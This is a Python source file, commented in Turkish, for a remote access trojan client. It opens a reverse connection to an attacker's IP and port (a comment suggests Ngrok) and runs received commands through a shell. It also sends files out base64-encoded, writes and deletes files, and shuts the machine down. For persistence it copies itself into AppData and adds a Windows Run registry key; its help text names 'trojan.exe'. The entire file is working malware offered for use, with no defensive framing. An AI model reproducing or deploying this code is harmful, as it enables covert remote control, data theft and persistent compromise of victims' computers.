import socket
import subprocess
import json
import os
import base64
import shutil
import sys

class Baglama:

    def __init__(self, ip, port):
        self.baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.baglanti.connect((ip, port))
    def komutİsleme(self, komut):
        try:
            if komut[0] == "çıkış":
                self.baglanti.close()
                exit()

            elif komut[0] == "cd" and len(komut)>1:
                os.chdir(komut[1]) #Klosörün içine geçiş
                return komut[1] + " Ulaşıldı"
            
            elif komut[0] == "indir":
                with open(komut[1], "rb") as dosya: #rb yapmanın sebebi binary sisteme çeviriyor
                    return base64.b64encode(dosya.read())
                
            elif komut[0] == "yükle":
                with open(komut[1],"wb") as dosya:
                    dosya.write(base64.b64decode(komut[2]))
                    return komut[1] + " Yüklendi"

            elif komut[0] == "kapat":
                try:
                    subprocess.run(["shutdown", "-h", "now"])
                    print("Kapatılıyor")

                except Exception as e:
                    print(e)
                
            elif komut[0] == "sil":
                dosya_adi = komut[1]
                return self.dosyaSil(dosya_adi)
            
            elif komut[0] == "help":
                return self.helpMenu()
                
            elif komut[0] == "oluştur":
                dosya_adi = komut[1]
                icerik = komut[2]
                return self.oluştur(dosya_adi, icerik)

            elif komut[0] == "cat":
                if len(komut) > 1:
                    dosyaAdi = komut[1]
                    return self.dosyaOku(dosyaAdi)
                else:
                    return "Okunacak dosya adını belirtin"


            elif komut[0] == "yerleş":
                dosyaUzantisi = os.environ["appdata"] + "\\" + komut[2]
                if not os.path.exists(dosyaUzantisi): #aynı isimde dosya varmı diye bakıyor
                    shutil.copyfile(sys.executable,dosyaUzantisi)
                    kayit = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "+komut[1]+" /t REG_SZ /d " + dosyaUzantisi
                    subprocess.call(kayit, shell=True)
                    return "Başarıyla Yerleşildi"

            else:
                return subprocess.check_output(komut, shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            
        except Exception:
            return "Hatass"

    def oluştur(self, dosya_adi, icerik):
        with open(dosya_adi, "w") as dosya:
            dosya.write(icerik)
        return dosya_adi + " Oluşturuldu."
    
    def dosyaSil(self, dosya_adi):
        try:
            os.remove(dosya_adi)
            return dosya_adi + " Silindi."
        except FileNotFoundError:
            return dosya_adi + " Bulunamadı."
        except Exception as e:
            return "Hata: " + str(e)
        

    def helpMenu(self):
        return """
        Kullanılabilir Komutlar:
        - cd [cd Masaüstü]: Belirtilen klasöre geçiş yapar.
        - oluştur [oluştur örnek.txt hacklendin] Dosya Oluşturur
        - indir [indir örnek.txt]: Belirtilen dosyayı indirir.
        - yükle [yükle örnek.txt]: Belirtilen dosyayı yükler.
        - sil [sil örnek.txt]: Belirtilen dosyayı siler.
        - yerleş [yerleş wind32 trojan.exe]: Programı belirtilen klasöre yerleştirir ve otomatik başlatma kaydı ekler.
        - çıkış: Bağlantıyı kapatır ve programı sonlandırır.
        - help: Bu yardım menüsünü görüntüler.
        """

    def paketleme(self, veri):
        if isinstance(veri, bytes):
            veri = veri.decode('iso-8859-15')  # Convert bytes to string
        paket = json.dumps(veri)
        self.baglanti.send(paket.encode('utf-8'))

    def paketCoz(self):
        gelenVeri = ""
        while True:
            try:
                gelenVeri = gelenVeri + self.baglanti.recv(1024).decode("utf-8")
                return json.loads(gelenVeri)
            except ValueError:
                continue


    def dosyaOku(self, dosyaAdi):
        try:
            if os.path.exists(dosyaAdi):
                with open(dosyaAdi, "r") as dosya:
                    return dosya.read()
            else:
                return "Dosya bulunamadı"
        except Exception as e:
            return f"Dosya okuma hatası: {e}"

    def baslatma(self):
        while True:
            try:
                komut = self.paketCoz()
                veri = self.komutİsleme(komut)
                self.paketleme(veri)

            except socket.timeout:
                print("Zaman Aşımı Hatası")
                break

            except Exception as e:
                print(f"Hata {e}")

        self.baglanti.close()

baglantiKurma = Baglama("<ip adresi>", "<port number>")
# Example
# baglantiKurma = Baglama("192.168.1.160", 888)
# Ngrok ile dış ağa da bağlantı yapılabilir
baglantiKurma.baslatma()